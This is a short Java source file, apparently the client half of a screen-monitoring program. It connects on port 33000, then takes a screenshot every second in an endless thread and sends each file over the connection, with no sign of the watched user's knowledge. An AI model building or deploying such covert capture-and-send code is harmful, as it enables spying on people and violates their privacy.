package monitored;

import java.io.File;

//
public class Test {

	public static void main(String[] args) {
		final Client client=new Client();
		client.conn(33000);
			new Thread(){
				public void run() {
					while(true){
						File file=client.getScreenShot("D://zhuangfeiphoto", ""+System.currentTimeMillis());
						client.sendFile(file);
						try {
							sleep(1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				};
			}.start();
	}

}
